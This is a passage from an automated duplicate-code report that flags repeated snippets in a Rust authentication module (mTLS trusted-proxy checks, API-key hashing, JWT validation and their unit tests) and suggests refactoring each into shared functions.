                let mask = if prefix_len == 0 {
                    0
                } else {
                    !0u128 << (128 - prefix_len)
                };
                (ip_bits & mask) == (net_bits & mask)
            }
            _ => false, // IPv4 and IPv6 don't match
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 85.5% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 115

**Code:**
```
    fn ip_in_cidr(ip: &IpAddr, network: &IpAddr, prefix_len: u8) -> bool {
        match (ip, network) {
            (IpAddr::V4(ip), IpAddr::V4(net)) => {
                let ip_bits = u32::from_be_bytes(ip.octets());
                let net_bits = u32::from_be_bytes(net.octets());
                let mask = if prefix_len == 0 {
                    0
                } else {
                    !0u32 << (32 - prefix_len)
                };
                (ip_bits & mask) == (net_bits & mask)
            }
            (IpAddr::V6(ip), IpAddr::V6(net)) => {
                let ip_bits = u128::from_be_bytes(ip.octets());
                let net_bits = u128::from_be_bytes(net.octets());
                let mask = if prefix_len == 0 {
                    0
                } else {
                    !0u128 << (128 - prefix_len)
                };
                (ip_bits & mask) == (net_bits & mask)
            }
            _ => false, // IPv4 and IPv6 don't match
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 85.4% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 415

**Code:**
```
    fn test_trusted_proxy_empty_rejects_all() {
        let validator = TrustedProxyValidator::new(&[]);

        // Empty config should reject all IPs
        assert!(!validator.is_trusted(&"127.0.0.1".parse().unwrap()));
        assert!(!validator.is_trusted(&"10.0.0.1".parse().unwrap()));
        assert!(!validator.is_trusted(&"8.8.8.8".parse().unwrap()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 85.2% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 425

**Code:**
```
    fn test_trusted_proxy_ipv6() {
        let validator = TrustedProxyValidator::new(&[
            "::1".to_string(),
            "fd00::/8".to_string(),
        ]);

        assert!(validator.is_trusted(&"::1".parse().unwrap()));
        assert!(validator.is_trusted(&"fd00::1".parse().unwrap()));
        assert!(!validator.is_trusted(&"fe80::1".parse().unwrap()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 85.0% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 115

**Code:**
```
    fn ip_in_cidr(ip: &IpAddr, network: &IpAddr, prefix_len: u8) -> bool {
        match (ip, network) {
            (IpAddr::V4(ip), IpAddr::V4(net)) => {
                let ip_bits = u32::from_be_bytes(ip.octets());
                let net_bits = u32::from_be_bytes(net.octets());
                let mask = if prefix_len == 0 {
                    0
                } else {
                    !0u32 << (32 - prefix_len)
                };
                (ip_bits & mask) == (net_bits & mask)
            }
            (IpAddr::V6(ip), IpAddr::V6(net)) => {
                let ip_bits = u128::from_be_bytes(ip.octets());
                let net_bits = u128::from_be_bytes(net.octets());
                let mask = if prefix_len == 0 {
                    0
                } else {
                    !0u128 << (128 - prefix_len)
                };
                (ip_bits & mask) == (net_bits & mask)
            }
            _ => false, // IPv4 and IPv6 don't match
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 85.0% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 64

**Code:**
```
    fn parse_range(s: &str) -> Option<TrustedRange> {
        let s = s.trim();

        if let Some((ip_str, prefix_str)) = s.split_once('/') {
            // CIDR format
            let network: IpAddr = ip_str.parse().ok()?;
            let prefix_len: u8 = prefix_str.parse().ok()?;

            // Validate prefix length
            let max_prefix = match network {
                IpAddr::V4(_) => 32,
                IpAddr::V6(_) => 128,
            };
            if prefix_len > max_prefix {
                return None;
            }

            Some(TrustedRange::Cidr { network, prefix_len })
        } else {
            // Single IP
            let ip: IpAddr = s.parse().ok()?;
            Some(TrustedRange::Single(ip))
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 84.8% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 363

**Code:**
```
    fn test_mtls_provider_creation() {
        let config = MtlsConfig {
            enabled: true,
            identity_source: MtlsIdentitySource::Cn,
            allowed_tools: vec!["read_file".to_string()],
            rate_limit: Some(100),
            trusted_proxy_ips: vec!["127.0.0.1".to_string()],
        };

        let provider = MtlsAuthProvider::new(config);
        assert_eq!(provider.name(), "mtls");
        assert!(provider.has_trusted_proxies());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 84.3% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 115

**Code:**
```
    fn ip_in_cidr(ip: &IpAddr, network: &IpAddr, prefix_len: u8) -> bool {
        match (ip, network) {
            (IpAddr::V4(ip), IpAddr::V4(net)) => {
                let ip_bits = u32::from_be_bytes(ip.octets());
                let net_bits = u32::from_be_bytes(net.octets());
                let mask = if prefix_len == 0 {
                    0
                } else {
                    !0u32 << (32 - prefix_len)
                };
                (ip_bits & mask) == (net_bits & mask)
            }
            (IpAddr::V6(ip), IpAddr::V6(net)) => {
                let ip_bits = u128::from_be_bytes(ip.octets());
                let net_bits = u128::from_be_bytes(net.octets());
                let mask = if prefix_len == 0 {
                    0
                } else {
                    !0u128 << (128 - prefix_len)
                };
                (ip_bits & mask) == (net_bits & mask)
            }
            _ => false, // IPv4 and IPv6 don't match
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 84.1% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 115

**Code:**
```
    fn ip_in_cidr(ip: &IpAddr, network: &IpAddr, prefix_len: u8) -> bool {
        match (ip, network) {
            (IpAddr::V4(ip), IpAddr::V4(net)) => {
                let ip_bits = u32::from_be_bytes(ip.octets());
                let net_bits = u32::from_be_bytes(net.octets());
                let mask = if prefix_len == 0 {
                    0
                } else {
                    !0u32 << (32 - prefix_len)
                };
                (ip_bits & mask) == (net_bits & mask)
            }
            (IpAddr::V6(ip), IpAddr::V6(net)) => {
                let ip_bits = u128::from_be_bytes(ip.octets());
                let net_bits = u128::from_be_bytes(net.octets());
                let mask = if prefix_len == 0 {
                    0
                } else {
                    !0u128 << (128 - prefix_len)
                };
                (ip_bits & mask) == (net_bits & mask)
            }
            _ => false, // IPv4 and IPv6 don't match
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 84.0% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 64

**Code:**
```
    fn parse_range(s: &str) -> Option<TrustedRange> {
        let s = s.trim();

        if let Some((ip_str, prefix_str)) = s.split_once('/') {
            // CIDR format
            let network: IpAddr = ip_str.parse().ok()?;
            let prefix_len: u8 = prefix_str.parse().ok()?;

            // Validate prefix length
            let max_prefix = match network {
                IpAddr::V4(_) => 32,
                IpAddr::V6(_) => 128,
            };
            if prefix_len > max_prefix {
                return None;
            }

            Some(TrustedRange::Cidr { network, prefix_len })
        } else {
            // Single IP
            let ip: IpAddr = s.parse().ok()?;
            Some(TrustedRange::Single(ip))
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 83.3% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 382

**Code:**
```
    fn test_trusted_proxy_single_ip() {
        let validator = TrustedProxyValidator::new(&[
            "10.0.0.1".to_string(),
            "192.168.1.100".to_string(),
        ]);

        assert!(validator.is_trusted(&"10.0.0.1".parse().unwrap()));
        assert!(validator.is_trusted(&"192.168.1.100".parse().unwrap()));
        assert!(!validator.is_trusted(&"10.0.0.2".parse().unwrap()));
        assert!(!validator.is_trusted(&"8.8.8.8".parse().unwrap()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 82.6% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 555

**Code:**
```
    fn test_extract_identity_missing_cn() {
        let config = MtlsConfig {
            enabled: true,
            identity_source: MtlsIdentitySource::Cn,
            allowed_tools: vec![],
            rate_limit: None,
            trusted_proxy_ips: vec![],
        };

        let provider = MtlsAuthProvider::new(config);
        let cert_info = ClientCertInfo {
            common_name: None,
            san_dns: vec!["client.example.com".to_string()],
            san_email: vec![],
            verified: true,
        };

        let result = provider.extract_identity(&cert_info);
        assert!(result.is_err());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 82.0% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 64

**Code:**
```
    fn parse_range(s: &str) -> Option<TrustedRange> {
        let s = s.trim();

        if let Some((ip_str, prefix_str)) = s.split_once('/') {
            // CIDR format
            let network: IpAddr = ip_str.parse().ok()?;
            let prefix_len: u8 = prefix_str.parse().ok()?;

            // Validate prefix length
            let max_prefix = match network {
                IpAddr::V4(_) => 32,
                IpAddr::V6(_) => 128,
            };
            if prefix_len > max_prefix {
                return None;
            }

            Some(TrustedRange::Cidr { network, prefix_len })
        } else {
            // Single IP
            let ip: IpAddr = s.parse().ok()?;
            Some(TrustedRange::Single(ip))
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 81.5% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 64

**Code:**
```
    fn parse_range(s: &str) -> Option<TrustedRange> {
        let s = s.trim();

        if let Some((ip_str, prefix_str)) = s.split_once('/') {
            // CIDR format
            let network: IpAddr = ip_str.parse().ok()?;
            let prefix_len: u8 = prefix_str.parse().ok()?;

            // Validate prefix length
            let max_prefix = match network {
                IpAddr::V4(_) => 32,
                IpAddr::V6(_) => 128,
            };
            if prefix_len > max_prefix {
                return None;
            }

            Some(TrustedRange::Cidr { network, prefix_len })
        } else {
            // Single IP
            let ip: IpAddr = s.parse().ok()?;
            Some(TrustedRange::Single(ip))
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 81.2% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 64

**Code:**
```
    fn parse_range(s: &str) -> Option<TrustedRange> {
        let s = s.trim();

        if let Some((ip_str, prefix_str)) = s.split_once('/') {
            // CIDR format
            let network: IpAddr = ip_str.parse().ok()?;
            let prefix_len: u8 = prefix_str.parse().ok()?;

            // Validate prefix length
            let max_prefix = match network {
                IpAddr::V4(_) => 32,
                IpAddr::V6(_) => 128,
            };
            if prefix_len > max_prefix {
                return None;
            }

            Some(TrustedRange::Cidr { network, prefix_len })
        } else {
            // Single IP
            let ip: IpAddr = s.parse().ok()?;
            Some(TrustedRange::Single(ip))
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 80.6% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 507

**Code:**
```
    fn test_extract_identity_from_cn() {
        let config = MtlsConfig {
            enabled: true,
            identity_source: MtlsIdentitySource::Cn,
            allowed_tools: vec![],
            rate_limit: None,
            trusted_proxy_ips: vec![],
        };

        let provider = MtlsAuthProvider::new(config);
        let cert_info = ClientCertInfo {
            common_name: Some("service-client".to_string()),
            san_dns: vec!["client.example.com".to_string()],
            san_email: vec![],
            verified: true,
        };

        let identity = provider.extract_identity(&cert_info).unwrap();
        assert_eq!(identity.id, "service-client");
        assert_eq!(identity.name, Some("service-client".to_string()));
        assert!(identity.allowed_tools.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 80.5% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 577

**Code:**
```
    fn test_client_cert_info_from_headers() {
        let mut headers = HeaderMap::new();
        headers.insert(HEADER_CLIENT_CERT_VERIFIED, "SUCCESS".parse().unwrap());
        headers.insert(HEADER_CLIENT_CERT_CN, "my-service".parse().unwrap());
        headers.insert(
            HEADER_CLIENT_CERT_SAN_DNS,
            "service.example.com, api.example.com".parse().unwrap(),
        );

        let cert_info = ClientCertInfo::from_headers_unchecked(&headers).unwrap();
        assert_eq!(cert_info.common_name, Some("my-service".to_string()));
        assert!(cert_info.verified);
        assert_eq!(cert_info.san_dns.len(), 2);
        assert_eq!(cert_info.san_dns[0], "service.example.com");
        assert_eq!(cert_info.san_dns[1], "api.example.com");
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 80.2% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 395

**Code:**
```
    fn test_trusted_proxy_cidr() {
        let validator = TrustedProxyValidator::new(&[
            "10.0.0.0/8".to_string(),
            "192.168.0.0/16".to_string(),
        ]);

        // Should match 10.x.x.x
        assert!(validator.is_trusted(&"10.0.0.1".parse().unwrap()));
        assert!(validator.is_trusted(&"10.255.255.255".parse().unwrap()));

        // Should match 192.168.x.x
        assert!(validator.is_trusted(&"192.168.0.1".parse().unwrap()));
        assert!(validator.is_trusted(&"192.168.255.255".parse().unwrap()));

        // Should not match others
        assert!(!validator.is_trusted(&"11.0.0.1".parse().unwrap()));
        assert!(!validator.is_trusted(&"192.169.0.1".parse().unwrap()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 80.2% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 459

**Code:**
```
    fn test_from_headers_if_trusted_rejects_untrusted() {
        let config = MtlsConfig {
            enabled: true,
            identity_source: MtlsIdentitySource::Cn,
            allowed_tools: vec![],
            rate_limit: None,
            trusted_proxy_ips: vec!["10.0.0.1".to_string()],
        };
        let provider = MtlsAuthProvider::new(config);

        let mut headers = HeaderMap::new();
        headers.insert(HEADER_CLIENT_CERT_VERIFIED, "SUCCESS".parse().unwrap());
        headers.insert(HEADER_CLIENT_CERT_CN, "spoofed-client".parse().unwrap());

        // Attacker IP not in trusted list
        let attacker_ip: IpAddr = "8.8.8.8".parse().unwrap();
        let cert_info = ClientCertInfo::from_headers_if_trusted(&headers, &attacker_ip, &provider);

        assert!(cert_info.is_none()); // Headers should be rejected
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 80.1% similarity.

- **File:** `src/auth/mtls.rs`
- **Line:** 437

**Code:**
```
    fn test_from_headers_if_trusted_accepts_trusted() {
        let config = MtlsConfig {
            enabled: true,
            identity_source: MtlsIdentitySource::Cn,
            allowed_tools: vec![],
            rate_limit: None,
            trusted_proxy_ips: vec!["10.0.0.1".to_string()],
        };
        let provider = MtlsAuthProvider::new(config);

        let mut headers = HeaderMap::new();
        headers.insert(HEADER_CLIENT_CERT_VERIFIED, "SUCCESS".parse().unwrap());
        headers.insert(HEADER_CLIENT_CERT_CN, "trusted-client".parse().unwrap());

        let trusted_ip: IpAddr = "10.0.0.1".parse().unwrap();
        let cert_info = ClientCertInfo::from_headers_if_trusted(&headers, &trusted_ip, &provider);

        assert!(cert_info.is_some());
        assert_eq!(cert_info.unwrap().common_name, Some("trusted-client".to_string()));
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.3% similarity.

- **File:** `src/auth/mod.rs`
- **Line:** 150

**Code:**
```
    fn hash_key(key: &str) -> String {
        use sha2::{Digest, Sha256};
        let mut hasher = Sha256::new();
        hasher.update(key.as_bytes());
        base64::Engine::encode(&base64::engine::general_purpose::STANDARD, hasher.finalize())
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 89.9% similarity.

- **File:** `src/auth/mod.rs`
- **Line:** 150

**Code:**
```
    fn hash_key(key: &str) -> String {
        use sha2::{Digest, Sha256};
        let mut hasher = Sha256::new();
        hasher.update(key.as_bytes());
        base64::Engine::encode(&base64::engine::general_purpose::STANDARD, hasher.finalize())
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 89.9% similarity.

- **File:** `src/auth/mod.rs`
- **Line:** 150

**Code:**
```
    fn hash_key(key: &str) -> String {
        use sha2::{Digest, Sha256};
        let mut hasher = Sha256::new();
        hasher.update(key.as_bytes());
        base64::Engine::encode(&base64::engine::general_purpose::STANDARD, hasher.finalize())
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 89.9% similarity.

- **File:** `src/auth/mod.rs`
- **Line:** 150

**Code:**
```
    fn hash_key(key: &str) -> String {
        use sha2::{Digest, Sha256};
        let mut hasher = Sha256::new();
        hasher.update(key.as_bytes());
        base64::Engine::encode(&base64::engine::general_purpose::STANDARD, hasher.finalize())
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 84.6% similarity.

- **File:** `src/auth/mod.rs`
- **Line:** 128

**Code:**
```
    fn name(&self) -> &str;
}

// ============================================================================
// Providers
// ============================================================================

/// API key authentication provider
///
/// Validates requests using pre-shared API keys. Keys are stored as SHA-256
/// hashes to prevent exposure of plaintext keys in configuration.
///
/// SECURITY: Uses constant-time comparison to prevent timing attacks.
pub struct ApiKeyProvider {
    keys: Vec<crate::config::ApiKeyConfig>,
}

impl ApiKeyProvider {
    pub fn new(configs: Vec<crate::config::ApiKeyConfig>) -> Self {
        Self { keys: configs }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 81.8% similarity.

- **File:** `src/auth/mod.rs`
- **Line:** 128

**Code:**
```
    fn name(&self) -> &str;
}

// ============================================================================
// Providers
// ============================================================================

/// API key authentication provider
///
/// Validates requests using pre-shared API keys. Keys are stored as SHA-256
/// hashes to prevent exposure of plaintext keys in configuration.
///
/// SECURITY: Uses constant-time comparison to prevent timing attacks.
pub struct ApiKeyProvider {
    keys: Vec<crate::config::ApiKeyConfig>,
}

impl ApiKeyProvider {
    pub fn new(configs: Vec<crate::config::ApiKeyConfig>) -> Self {
        Self { keys: configs }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.7% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 982

**Code:**
```
    fn test_extract_scopes_empty_array() {
        let provider = create_simple_provider();
        
        let mut claims = HashMap::new();
        claims.insert("scope".to_string(), serde_json::json!([]));
        let scopes = provider.extract_scopes(&claims);
        assert!(scopes.is_empty());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.6% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 848

**Code:**
```
    fn test_jwks_cache_new_starts_expired() {
        let cache = JwksCache::new(Duration::from_secs(3600));
        // Cache should start expired to trigger immediate refresh
        assert!(cache.is_expired());
        assert!(cache.keys.is_empty());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.5% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 231

**Code:**
```
    fn build_validation(&self, algorithm: Algorithm) -> Validation {
        let mut validation = Validation::new(algorithm);
        validation.set_issuer(&[&self.config.issuer]);
        validation.set_audience(&[&self.config.audience]);
        validation.leeway = self.config.leeway_secs;
        validation
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.5% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 392

**Code:**
```
    fn create_simple_provider() -> JwtProvider {
        let config = JwtConfig {
            mode: JwtMode::Simple {
                secret: TEST_SECRET.to_string(),
            },
            issuer: "test-issuer".to_string(),
            audience: "test-audience".to_string(),
            user_id_claim: "sub".to_string(),
            scopes_claim: "scope".to_string(),
            scope_tool_mapping: HashMap::new(),
            leeway_secs: 0,
        };
        JwtProvider::new(config).unwrap()
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 94.0% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 392

**Code:**
```
    fn create_simple_provider() -> JwtProvider {
        let config = JwtConfig {
            mode: JwtMode::Simple {
                secret: TEST_SECRET.to_string(),
            },
            issuer: "test-issuer".to_string(),
            audience: "test-audience".to_string(),
            user_id_claim: "sub".to_string(),
            scopes_claim: "scope".to_string(),
            scope_tool_mapping: HashMap::new(),
            leeway_secs: 0,
        };
        JwtProvider::new(config).unwrap()
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 93.6% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 848

**Code:**
```
    fn test_jwks_cache_new_starts_expired() {
        let cache = JwksCache::new(Duration::from_secs(3600));
        // Cache should start expired to trigger immediate refresh
        assert!(cache.is_expired());
        assert!(cache.keys.is_empty());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.9% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 49

**Code:**
```
    fn new(cache_duration: Duration) -> Self {
        Self {
            keys: HashMap::new(),
            fetched_at: Instant::now() - cache_duration - Duration::from_secs(1), // Start expired
            cache_duration,
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.9% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 49

**Code:**
```
    fn new(cache_duration: Duration) -> Self {
        Self {
            keys: HashMap::new(),
            fetched_at: Instant::now() - cache_duration - Duration::from_secs(1), // Start expired
            cache_duration,
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.9% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 848

**Code:**
```
    fn test_jwks_cache_new_starts_expired() {
        let cache = JwksCache::new(Duration::from_secs(3600));
        // Cache should start expired to trigger immediate refresh
        assert!(cache.is_expired());
        assert!(cache.keys.is_empty());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.9% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 848

**Code:**
```
    fn test_jwks_cache_new_starts_expired() {
        let cache = JwksCache::new(Duration::from_secs(3600));
        // Cache should start expired to trigger immediate refresh
        assert!(cache.is_expired());
        assert!(cache.keys.is_empty());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 92.4% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 231

**Code:**
```
    fn build_validation(&self, algorithm: Algorithm) -> Validation {
        let mut validation = Validation::new(algorithm);
        validation.set_issuer(&[&self.config.issuer]);
        validation.set_audience(&[&self.config.audience]);
        validation.leeway = self.config.leeway_secs;
        validation
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 91.9% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 940

**Code:**
```
    fn test_build_validation_sets_correct_params() {
        let provider = create_simple_provider();
        let validation = provider.build_validation(Algorithm::HS256);
        
        // Validation should be configured with issuer and audience
        // We can't directly inspect private fields, but we can verify it works
        assert!(!validation.algorithms.is_empty());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 91.7% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 878

**Code:**
```
    fn test_jwks_provider_creation() {
        let config = JwtConfig {
            mode: JwtMode::Jwks {
                jwks_url: "https://example.com/.well-known/jwks.json".to_string(),
                algorithms: vec!["RS256".to_string()],
                cache_duration_secs: 3600,
            },
            issuer: "https://example.com".to_string(),
            audience: "test-audience".to_string(),
            user_id_claim: "sub".to_string(),
            scopes_claim: "scope".to_string(),
            scope_tool_mapping: HashMap::new(),
            leeway_secs: 0,
        };
        
        let provider = JwtProvider::new(config);
        assert!(provider.is_ok());
        
        let provider = provider.unwrap();
        assert!(provider.jwks_cache.is_some());
        assert!(provider.http_client.is_some());
        assert!(provider.simple_key.is_none());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 91.5% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 231

**Code:**
```
    fn build_validation(&self, algorithm: Algorithm) -> Validation {
        let mut validation = Validation::new(algorithm);
        validation.set_issuer(&[&self.config.issuer]);
        validation.set_audience(&[&self.config.audience]);
        validation.leeway = self.config.leeway_secs;
        validation
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 91.3% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 49

**Code:**
```
    fn new(cache_duration: Duration) -> Self {
        Self {
            keys: HashMap::new(),
            fetched_at: Instant::now() - cache_duration - Duration::from_secs(1), // Start expired
            cache_duration,
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 90.7% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 392

**Code:**
```
    fn create_simple_provider() -> JwtProvider {
        let config = JwtConfig {
            mode: JwtMode::Simple {
                secret: TEST_SECRET.to_string(),
            },
            issuer: "test-issuer".to_string(),
            audience: "test-audience".to_string(),
            user_id_claim: "sub".to_string(),
            scopes_claim: "scope".to_string(),
            scope_tool_mapping: HashMap::new(),
            leeway_secs: 0,
        };
        JwtProvider::new(config).unwrap()
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 90.4% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 867

**Code:**
```
    fn test_jwks_cache_not_expired_within_duration() {
        let mut cache = JwksCache::new(Duration::from_secs(3600));
        cache.fetched_at = Instant::now();
        assert!(!cache.is_expired());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 90.4% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 369

**Code:**
```
fn parse_algorithm(alg: &str) -> Option<Algorithm> {
    match alg {
        "HS256" => Some(Algorithm::HS256),
        "HS384" => Some(Algorithm::HS384),
        "HS512" => Some(Algorithm::HS512),
        "RS256" => Some(Algorithm::RS256),
        "RS384" => Some(Algorithm::RS384),
        "RS512" => Some(Algorithm::RS512),
        "ES256" => Some(Algorithm::ES256),
        "ES384" => Some(Algorithm::ES384),
        _ => None,
    }
}
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 90.1% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 867

**Code:**
```
    fn test_jwks_cache_not_expired_within_duration() {
        let mut cache = JwksCache::new(Duration::from_secs(3600));
        cache.fetched_at = Instant::now();
        assert!(!cache.is_expired());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 89.9% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 49

**Code:**
```
    fn new(cache_duration: Duration) -> Self {
        Self {
            keys: HashMap::new(),
            fetched_at: Instant::now() - cache_duration - Duration::from_secs(1), // Start expired
            cache_duration,
        }
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 89.3% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 867

**Code:**
```
    fn test_jwks_cache_not_expired_within_duration() {
        let mut cache = JwksCache::new(Duration::from_secs(3600));
        cache.fetched_at = Instant::now();
        assert!(!cache.is_expired());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 89.1% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 369

**Code:**
```
fn parse_algorithm(alg: &str) -> Option<Algorithm> {
    match alg {
        "HS256" => Some(Algorithm::HS256),
        "HS384" => Some(Algorithm::HS384),
        "HS512" => Some(Algorithm::HS512),
        "RS256" => Some(Algorithm::RS256),
        "RS384" => Some(Algorithm::RS384),
        "RS512" => Some(Algorithm::RS512),
        "ES256" => Some(Algorithm::ES256),
        "ES384" => Some(Algorithm::ES384),
        _ => None,
    }
}
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 89.1% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 369

**Code:**
```
fn parse_algorithm(alg: &str) -> Option<Algorithm> {
    match alg {
        "HS256" => Some(Algorithm::HS256),
        "HS384" => Some(Algorithm::HS384),
        "HS512" => Some(Algorithm::HS512),
        "RS256" => Some(Algorithm::RS256),
        "RS384" => Some(Algorithm::RS384),
        "RS512" => Some(Algorithm::RS512),
        "ES256" => Some(Algorithm::ES256),
        "ES384" => Some(Algorithm::ES384),
        _ => None,
    }
}
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.9% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 972

**Code:**
```
    fn test_extract_scopes_empty_string() {
        let provider = create_simple_provider();
        
        let mut claims = HashMap::new();
        claims.insert("scope".to_string(), serde_json::json!(""));
        let scopes = provider.extract_scopes(&claims);
        assert!(scopes.is_empty());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.8% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 392

**Code:**
```
    fn create_simple_provider() -> JwtProvider {
        let config = JwtConfig {
            mode: JwtMode::Simple {
                secret: TEST_SECRET.to_string(),
            },
            issuer: "test-issuer".to_string(),
            audience: "test-audience".to_string(),
            user_id_claim: "sub".to_string(),
            scopes_claim: "scope".to_string(),
            scope_tool_mapping: HashMap::new(),
            leeway_secs: 0,
        };
        JwtProvider::new(config).unwrap()
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.8% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 231

**Code:**
```
    fn build_validation(&self, algorithm: Algorithm) -> Validation {
        let mut validation = Validation::new(algorithm);
        validation.set_issuer(&[&self.config.issuer]);
        validation.set_audience(&[&self.config.audience]);
        validation.leeway = self.config.leeway_secs;
        validation
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 88.2% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 240

**Code:**
```
    fn extract_scopes(&self, claims: &HashMap<String, serde_json::Value>) -> Vec<String> {
        claims
            .get(&self.config.scopes_claim)
            .map(|v| match v {
                // Space-separated string (OAuth2 style)
                serde_json::Value::String(s) => {
                    s.split_whitespace().map(String::from).collect()
                }
                // Array of strings
                serde_json::Value::Array(arr) => {
                    arr.iter()
                        .filter_map(|v| v.as_str())
                        .map(String::from)
                        .collect()
                }
                _ => vec![],
            })
            .unwrap_or_default()
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 87.9% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 848

**Code:**
```
    fn test_jwks_cache_new_starts_expired() {
        let cache = JwksCache::new(Duration::from_secs(3600));
        // Cache should start expired to trigger immediate refresh
        assert!(cache.is_expired());
        assert!(cache.keys.is_empty());
    }
```

---

#### Consider extracting the duplicated code into a shared function or module. Type-3 clone with 87.0% similarity.

- **File:** `src/auth/jwt.rs`
- **Line:** 240

**Code:**
```
